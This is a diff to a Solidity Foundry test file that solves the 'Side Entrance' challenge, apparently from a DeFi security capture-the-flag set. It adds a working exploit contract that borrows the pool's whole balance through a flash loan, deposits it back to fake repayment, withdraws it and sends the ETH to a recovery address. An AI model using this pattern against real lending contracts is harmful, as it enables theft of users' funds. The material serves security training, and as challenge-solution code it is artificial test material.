@@ -5,6 +5,29 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+contract ExploitContract {
+    SideEntranceLenderPool public pool;
+    address public recovery;
+
+    receive() external payable {
+        payable(recovery).transfer(address(this).balance);
+    }
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+
+    function exploit() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+    }
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +68,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        ExploitContract exploitContract = new ExploitContract(pool, recovery);
+        exploitContract.exploit();
+
     }
 
     /**
@@ -53,6 +78,10 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
 }
